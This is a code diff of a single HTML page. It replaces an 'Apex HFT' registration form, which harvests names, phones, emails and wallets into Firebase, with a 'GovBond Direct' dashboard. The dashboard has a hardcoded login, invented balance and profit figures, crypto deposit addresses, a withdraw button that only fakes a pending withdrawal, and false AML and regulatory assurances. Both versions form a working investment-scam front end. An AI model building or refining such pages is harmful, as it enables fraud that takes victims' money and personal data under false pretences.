@@ -3,273 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apex HFT Arbitrage Engine</title>
+    <title>GovBond Direct | Premium Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;600;700&display=swap');
-        
-        body {
-            font-family: 'Space Grotesk', sans-serif;
-            background-color: #0a0a0f;
-            color: #e2e8f0;
-            background-image: 
-                radial-gradient(circle at 15% 50%, rgba(30, 58, 138, 0.15) 0%, transparent 50%),
-                radial-gradient(circle at 85% 30%, rgba(16, 185, 129, 0.1) 0%, transparent 50%);
-        }
-        
-        .glass-panel {
-            background: rgba(17, 24, 39, 0.7);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-        }
-
-        .input-field {
-            background: rgba(31, 41, 55, 0.5);
-            border: 1px solid rgba(75, 85, 99, 0.4);
-            color: white;
-            transition: all 0.3s ease;
-        }
-
-        .input-field:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
-            outline: none;
-        }
-
-        .glow-button {
-            background: linear-gradient(135deg, #2563eb 0%, #10b981 100%);
-            transition: all 0.3s ease;
-        }
-
-        .glow-button:hover {
-            box-shadow: 0 0 20px rgba(16, 185, 129, 0.4);
-            transform: translateY(-1px);
-        }
-
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #0a0a0f; }
-        ::-webkit-scrollbar-thumb { background: #374151; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #4b5563; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #0f172a; }
+        .card-bg { background-color: #1e293b; border: 1px solid #334155; }
+        .btn-amber { background-color: #fbbf24; color: #0f172a; font-weight: 700; transition: all 0.3s; }
+        .btn-amber:hover { background-color: #f59e0b; }
+        .ticker-container { overflow: hidden; white-space: nowrap; }
+        .ticker-text { display: inline-block; padding-left: 100%; animation: ticker 20s linear infinite; }
+        @keyframes ticker { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
+        .pulse-text { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; color: #fbbf24; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
     </style>
 </head>
-<body class="min-h-screen flex flex-col antialiased relative">
+<body class="text-slate-100 min-h-screen">
 
-    <header class="w-full py-6 px-8 flex justify-center items-center border-b border-gray-800 glass-panel sticky top-0 z-10">
-        <div class="flex items-center gap-3">
-            <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-blue-600 to-emerald-500 flex items-center justify-center shadow-lg shadow-blue-500/20">
-                <i class="fa-solid fa-chart-line text-white text-xl"></i>
-            </div>
-            <h1 class="text-2xl font-bold tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-white to-gray-400">
-                APEX <span class="text-blue-500 font-light">HFT</span>
-            </h1>
-        </div>
-    </header>
-
-    <main id="user-view" class="flex-grow flex items-center justify-center p-4 sm:p-8">
-        <div class="glass-panel rounded-2xl w-full max-w-xl p-8 relative overflow-hidden">
-            <div class="absolute top-0 left-0 w-16 h-16 border-t-2 border-l-2 border-blue-500/30 rounded-tl-2xl"></div>
-            <div class="absolute bottom-0 right-0 w-16 h-16 border-b-2 border-r-2 border-emerald-500/30 rounded-br-2xl"></div>
-
-            <div class="text-center mb-8">
-                <h2 class="text-3xl font-bold mb-2">Create Account</h2>
-                <p class="text-gray-400 text-sm">Join the Apex High-Frequency Arbitrage Engine</p>
-            </div>
-
-            <form id="registration-form" class="space-y-5">
-                <div>
-                    <label class="block text-sm font-medium text-gray-400 mb-1">Full Name</label>
-                    <input type="text" id="name" required class="input-field w-full rounded-lg px-4 py-3 text-sm placeholder-gray-500" placeholder="e.g. John Doe">
-                </div>
-
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
-                    <div>
-                        <label class="block text-sm font-medium text-gray-400 mb-1">Email Address</label>
-                        <input type="email" id="email" required class="input-field w-full rounded-lg px-4 py-3 text-sm placeholder-gray-500" placeholder="john@example.com">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-medium text-gray-400 mb-1">Phone Number</label>
-                        <input type="tel" id="phone" required class="input-field w-full rounded-lg px-4 py-3 text-sm placeholder-gray-500" placeholder="+1 234 567 8900">
-                    </div>
-                </div>
-
-                <div>
-                    <label class="block text-sm font-medium text-gray-400 mb-1">Country</label>
-                    <div class="relative">
-                        <select id="country" required class="input-field w-full rounded-lg px-4 py-3 text-sm appearance-none cursor-pointer">
-                            <option value="" disabled selected>Select your country...</option>
-                        </select>
-                        <i class="fa-solid fa-chevron-down absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none"></i>
-                    </div>
-                </div>
-
-                <div class="bg-gray-800/30 p-4 rounded-xl border border-gray-700/50 mt-6">
-                    <h3 class="text-sm font-medium text-blue-400 mb-4 flex items-center gap-2">
-                        <i class="fa-solid fa-wallet"></i> Payout Configuration
-                    </h3>
-                    
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-xs font-medium text-gray-400 mb-1">Select Network</label>
-                            <div class="grid grid-cols-5 gap-2" id="network-selector">
-                                <button type="button" class="network-btn active bg-blue-600/20 border border-blue-500 text-blue-400 rounded-md py-2 text-xs font-semibold transition hover:bg-blue-600/30" data-network="BTC">BTC</button>
-                                <button type="button" class="network-btn bg-gray-700/30 border border-gray-600 text-gray-400 rounded-md py-2 text-xs font-semibold transition hover:bg-gray-700/50" data-network="ETH">ETH</button>
-                                <button type="button" class="network-btn bg-gray-700/30 border border-gray-600 text-gray-400 rounded-md py-2 text-xs font-semibold transition hover:bg-gray-700/50" data-network="SOL">SOL</button>
-                                <button type="button" class="network-btn bg-gray-700/30 border border-gray-600 text-gray-400 rounded-md py-2 text-xs font-semibold transition hover:bg-gray-700/50" data-network="BNB">BNB</button>
-                                <button type="button" class="network-btn bg-gray-700/30 border border-gray-600 text-gray-400 rounded-md py-2 text-xs font-semibold transition hover:bg-gray-700/50" data-network="USDT">USDT</button>
-                            </div>
-                            <input type="hidden" id="wallet-network" value="BTC">
-                        </div>
-
-                        <div>
-                            <label class="block text-xs font-medium text-gray-400 mb-1">Wallet Address</label>
-                            <input type="text" id="wallet-address" required class="input-field w-full rounded-lg px-4 py-3 text-sm font-mono placeholder-gray-600" placeholder="Paste your wallet address here...">
-                        </div>
-                    </div>
-                </div>
-
-                <button type="submit" id="submit-btn" class="glow-button w-full rounded-lg px-4 py-4 text-sm font-bold text-white uppercase tracking-wider mt-6 flex justify-center items-center gap-2">
-                    <span>Initialize Engine Setup</span>
-                    <i class="fa-solid fa-arrow-right"></i>
-                </button>
-            </form>
-        </div>
-    </main>
-
-    <main id="admin-view" class="flex-grow hidden flex-col p-4 sm:p-8 max-w-7xl mx-auto w-full">
-        <div class="flex justify-between items-center mb-8">
-            <div>
-                <h2 class="text-2xl font-bold">Admin Command Center</h2>
-                <p class="text-emerald-400 text-sm">Engine Registrations Overview</p>
-            </div>
-            <button id="exit-admin-btn" class="px-4 py-2 bg-gray-800 rounded-lg text-sm hover:bg-gray-700 border border-gray-700 transition">
-                <i class="fa-solid fa-right-from-bracket mr-2"></i> Exit
-            </button>
-        </div>
-        <div class="glass-panel rounded-xl overflow-hidden w-full overflow-x-auto">
-            <table class="w-full text-left text-sm whitespace-nowrap">
-                <thead class="bg-gray-800/80 text-gray-300">
-                    <tr>
-                        <th class="px-6 py-4 font-semibold">Date</th>
-                        <th class="px-6 py-4 font-semibold">Name</th>
-                        <th class="px-6 py-4 font-semibold">Contact</th>
-                        <th class="px-6 py-4 font-semibold">Country</th>
-                        <th class="px-6 py-4 font-semibold">Wallet</th>
-                    </tr>
-                </thead>
-                <tbody id="admin-table-body" class="divide-y divide-gray-800/50">
-                    <tr><td colspan="5" class="px-6 py-8 text-center text-gray-500"><i class="fa-solid fa-circle-notch fa-spin"></i> Loading...</td></tr>
-                </tbody>
-            </table>
-        </div>
-    </main>
-
-    <div id="success-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4 opacity-0 transition-opacity duration-300">
-        <div class="glass-panel rounded-2xl max-w-md w-full p-8 text-center transform scale-95 transition-transform duration-300 border border-emerald-500/30">
-            <div class="w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
-                <i class="fa-solid fa-check text-4xl text-emerald-400"></i>
-            </div>
-            <h3 class="text-2xl font-bold mb-3 text-white">Application Received</h3>
-            <p class="text-gray-400 leading-relaxed mb-6">
-                Your details have been successfully submitted. Please check your email inbox (and your <strong>spam folder</strong>) for a confirmation within 15 minutes.
-            </p>
-            <button id="close-modal-btn" class="w-full py-3 bg-gray-800 hover:bg-gray-700 rounded-lg font-medium transition text-white border border-gray-700">Acknowledge</button>
+    <div id="login-screen" class="fixed inset-0 z-50 flex items-center justify-center bg-slate-950">
+        <div class="card-bg p-8 rounded-2xl w-full max-w-md shadow-2xl">
+            <h2 class="text-2xl font-bold mb-6 text-center text-white">GovBond Access Portal</h2>
+            <input id="user-input" type="text" placeholder="Username" class="w-full p-3 mb-4 bg-slate-900 border border-slate-700 rounded-lg text-white">
+            <input id="pass-input" type="password" placeholder="Password" class="w-full p-3 mb-6 bg-slate-900 border border-slate-700 rounded-lg text-white">
+            <button onclick="checkAuth()" class="w-full btn-amber py-3 rounded-lg">Enter Dashboard</button>
         </div>
     </div>
 
-    <button id="admin-trigger" class="fixed bottom-4 right-4 w-8 h-8 flex items-center justify-center rounded-full text-gray-700 hover:text-gray-400 transition z-20" title="Admin Access">
-        <i class="fa-solid fa-lock text-xs"></i>
-    </button>
+    <div id="app" class="hidden min-h-screen p-6">
+        <header class="max-w-6xl mx-auto flex justify-between items-center mb-8">
+            <h1 class="text-2xl font-bold text-white">GovBond <span class="text-amber-400">Direct</span></h1>
+            <div class="flex items-center gap-4">
+                <span id="btc-price" class="text-sm font-mono text-amber-400 bg-slate-900 px-4 py-2 rounded-full border border-slate-700">BTC: Loading...</span>
+            </div>
+        </header>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, collection, addDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        <main class="max-w-6xl mx-auto space-y-6">
+            <!-- News Ticker -->
+            <div class="bg-slate-800 border border-slate-700 p-3 rounded-lg ticker-container">
+                <div class="ticker-text text-amber-400 text-sm">
+                    📢 NEWS: Treasury yields edge higher as inflation data released... <a href="#" class="underline">Read More</a> | Federal Reserve signals potential rate holds... <a href="#" class="underline">Read More</a>
+                </div>
+            </div>
 
-        // Your configuration integrated here
-        const firebaseConfig = {
-            apiKey: "AIzaSyBRS9IkASSv0uERqjWoBX3wrnVPaBMDcw4",
-            authDomain: "apex-e2d46.firebaseapp.com",
-            projectId: "apex-e2d46",
-            storageBucket: "apex-e2d46.firebasestorage.app",
-            messagingSenderId: "601246281619",
-            appId: "1:601246281619:web:54eb9937637115316b4266",
-            measurementId: "G-RZG5F5XHK1"
-        };
-        
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const db = getFirestore(app);
-        let currentUser = null;
-        let unsubscribeData = null;
+            <!-- Hero Card -->
+            <div class="card-bg p-8 rounded-2xl relative overflow-hidden">
+                <div class="relative z-10">
+                    <h2 class="text-3xl font-bold text-white mb-2">GovBond Direct Portfolio</h2>
+                    <p class="text-slate-400 mb-6">Manage your illustrative bond portfolio — deposit, track profit to maturity, and request withdrawals.</p>
+                    <div class="flex gap-4">
+                        <button class="bg-slate-700 text-white px-6 py-2 rounded-lg font-bold">HFT engines working</button>
+                        <button class="bg-slate-900 text-slate-400 px-6 py-2 rounded-lg font-bold">wait for update</button>
+                    </div>
+                </div>
+                <!-- Decorative element -->
+                <div class="absolute right-0 top-0 opacity-10 pointer-events-none">
+                    <svg width="300" height="300" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
+                </div>
+            </div>
 
-        signInAnonymously(auth);
-        onAuthStateChanged(auth, (user) => { currentUser = user; });
+            <!-- Stats Grid -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <div class="card-bg p-6 rounded-2xl">
+                    <p class="text-slate-400 text-sm uppercase tracking-wider font-semibold">Available Balance</p>
+                    <p class="text-4xl font-bold text-white mt-2">$1,500.00</p>
+                </div>
+                <div class="card-bg p-6 rounded-2xl">
+                    <p class="text-slate-400 text-sm uppercase tracking-wider font-semibold">Accrued Profit</p>
+                    <p class="text-4xl font-bold text-emerald-400 mt-2">+$5,894.00</p>
+                </div>
+                <div class="card-bg p-6 rounded-2xl">
+                    <p class="text-slate-400 text-sm uppercase tracking-wider font-semibold">Time to Maturity</p>
+                    <p id="maturity-clock" class="text-4xl font-bold text-white mt-2 font-mono pulse-text">2 days</p>
+                </div>
+            </div>
 
-        // Populate Countries
-        const countries = ["Afghanistan", "Albania", "Algeria", "Argentina", "Australia", "Brazil", "Canada", "China", "Egypt", "France", "Germany", "India", "Italy", "Japan", "Mexico", "Nigeria", "Russia", "South Africa", "Spain", "United Kingdom", "United States"];
-        const countrySelect = document.getElementById('country');
-        countries.forEach(c => { const o = document.createElement('option'); o.value = c; o.textContent = c; countrySelect.appendChild(o); });
+            <!-- Actions -->
+            <div class="flex gap-4 items-center">
+                <button onclick="toggleModal('deposit-modal')" class="btn-amber px-8 py-3 rounded-xl flex items-center gap-2">Deposit</button>
+                <button id="withdraw-btn" onclick="handleWithdrawal()" class="bg-emerald-600 text-white px-8 py-3 rounded-xl font-bold hover:bg-emerald-700 transition-all">Withdraw</button>
+                <div class="bg-slate-800 border border-slate-700 px-4 py-3 rounded-xl text-amber-400 font-bold border-l-4 border-l-amber-400">
+                    Next Payout: 07/15/2026: 11:00 am
+                </div>
+            </div>
 
-        // Network Logic
-        const networkBtns = document.querySelectorAll('.network-btn');
-        networkBtns.forEach(btn => btn.addEventListener('click', () => {
-            networkBtns.forEach(b => { b.classList.remove('bg-blue-600/20', 'border-blue-500', 'text-blue-400'); b.classList.add('bg-gray-700/30', 'border-gray-600', 'text-gray-400'); });
-            btn.classList.remove('bg-gray-700/30', 'border-gray-600', 'text-gray-400');
-            btn.classList.add('bg-blue-600/20', 'border-blue-500', 'text-blue-400');
-            document.getElementById('wallet-network').value = btn.dataset.network;
-        }));
+            <!-- Legal/Contact -->
+            <div class="flex gap-4">
+                <button onclick="openLegal('terms')" class="bg-slate-800 text-slate-300 px-4 py-2 rounded-lg text-sm hover:text-white">Terms of Service</button>
+                <button onclick="openLegal('aml')" class="bg-slate-800 text-slate-300 px-4 py-2 rounded-lg text-sm hover:text-white">AML Compliance</button>
+                <a href="https://wa.me/+14012125905" target="_blank" class="bg-green-700 text-white px-4 py-2 rounded-lg text-sm">WhatsApp Support</a>
+                <a href="https://t.me/janesclan" target="_blank" class="bg-sky-700 text-white px-4 py-2 rounded-lg text-sm">Telegram Support</a>
+            </div>
+        </main>
+    </div>
 
-        // Form Submit
-        document.getElementById('registration-form').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            // Disable button to prevent double-click
-            const submitBtn = document.getElementById('submit-btn');
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
+    <!-- Modals -->
+    <div id="deposit-modal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50">
+        <div class="card-bg p-8 rounded-2xl w-full max-w-lg">
+            <h2 class="text-xl font-bold text-white mb-4">Deposit Assets</h2>
+            <div class="space-y-4">
+                <div class="p-4 bg-slate-900 border border-slate-700 rounded-lg cursor-pointer" onclick="copy('0xA18d7A53655f5fa110dd7D17A33FA1Ff8fc2Ef55')"><p class="text-amber-400 text-xs font-bold">ETH</p><p class="text-xs text-white font-mono break-all">0xA18d7A53655f5fa110dd7D17A33FA1Ff8fc2Ef55</p></div>
+                <div class="p-4 bg-slate-900 border border-slate-700 rounded-lg cursor-pointer" onclick="copy('bc1q3ucw3ddh8cszq63n5nesghnyluc2gkrsnq39ws')"><p class="text-amber-400 text-xs font-bold">BTC</p><p class="text-xs text-white font-mono break-all">bc1q3ucw3ddh8cszq63n5nesghnyluc2gkrsnq39ws</p></div>
+            </div>
+            <button onclick="toggleModal('deposit-modal')" class="mt-6 w-full py-3 bg-slate-700 text-white rounded-lg font-bold">Close</button>
+        </div>
+    </div>
 
-            const payload = {
-                name: document.getElementById('name').value,
-                email: document.getElementById('email').value,
-                phone: document.getElementById('phone').value,
-                country: document.getElementById('country').value,
-                network: document.getElementById('wallet-network').value,
-                walletAddress: document.getElementById('wallet-address').value,
-                timestamp: new Date().toISOString()
-            };
-            
+    <!-- Legal Modals -->
+    <div id="legal-modal" class="hidden fixed inset-0 bg-black/90 flex items-center justify-center p-4 z-50">
+        <div class="card-bg p-8 rounded-2xl w-full max-w-lg">
+            <h2 id="legal-title" class="text-xl font-bold text-white mb-4"></h2>
+            <p id="legal-content" class="text-slate-400 text-sm mb-6"></p>
+            <button onclick="document.getElementById('legal-modal').classList.add('hidden')" class="w-full py-3 bg-slate-700 text-white rounded-lg">Close</button>
+        </div>
+    </div>
+
+    <script>
+        function checkAuth() {
+            if (document.getElementById('user-input').value === 'powerful' && document.getElementById('pass-input').value === 'powerful') {
+                document.getElementById('login-screen').classList.add('hidden');
+                document.getElementById('app').classList.remove('hidden');
+            } else { alert('Invalid Credentials'); }
+        }
+
+        function toggleModal(id) { document.getElementById(id).classList.toggle('hidden'); }
+
+        function openLegal(type) {
+            const m = document.getElementById('legal-modal');
+            const t = document.getElementById('legal-title');
+            const c = document.getElementById('legal-content');
+            if(type === 'terms') { t.innerText = 'Terms of Service'; c.innerText = 'By accessing GovBond Direct, you acknowledge the inherent risks of bond market fluctuations. Past performance is not indicative of future results.'; }
+            else { t.innerText = 'AML Compliance'; c.innerText = 'All users must verify their identity. We adhere to federal banking regulations and monitor for suspicious activity.'; }
+            m.classList.remove('hidden');
+        }
+
+        async function fetchBtc() {
             try {
-                await addDoc(collection(db, 'registrations'), payload);
-                
-                // Show modal
-                const modal = document.getElementById('success-modal');
-                modal.classList.remove('hidden');
-                // Force a browser reflow to allow transition
-                void modal.offsetWidth;
-                modal.classList.remove('opacity-0');
-                
-                e.target.reset();
-            } catch (err) { 
-                console.error(err); 
-                alert("Submission failed. Please try again.");
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '<span>Initialize Engine Setup</span><i class="fa-solid fa-arrow-right"></i>';
-            }
-        });
-        
-        document.getElementById('exit-admin-btn').addEventListener('click', () => {
-            document.getElementById('admin-view').classList.add('hidden');
-            document.getElementById('user-view').classList.remove('hidden');
-            if(unsubscribeData) unsubscribeData();
-        });
+                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+                const d = await res.json();
+                document.getElementById('btc-price').innerText = 'BTC/USD $' + d.bitcoin.usd.toLocaleString();
+            } catch (e) { document.getElementById('btc-price').innerText = 'BTC/USD Error'; }
+        }
+        setInterval(fetchBtc, 30000); fetchBtc();
 
-        document.getElementById('close-modal-btn').addEventListener('click', () => {
-            document.getElementById('success-modal').classList.add('opacity-0');
-            setTimeout(() => document.getElementById('success-modal').classList.add('hidden'), 300);
-        });
+        function handleWithdrawal() {
+            const btn = document.getElementById('withdraw-btn');
+            btn.innerText = "Processing...";
+            const o = document.createElement('div');
+            o.className = 'fixed inset-0 bg-black/90 flex items-center justify-center z-50 text-white font-bold text-xl';
+            o.innerHTML = 'Processing, please check your email for confirmation...';
+            document.body.appendChild(o);
+            setTimeout(() => { o.remove(); btn.innerText = "Withdrawal Pending"; btn.className = 'bg-yellow-600 text-white px-8 py-3 rounded-xl font-bold'; }, 2000);
+        }
+
+        function copy(t) { navigator.clipboard.writeText(t); alert('Copied!'); }
     </script>
 </body>
 </html>
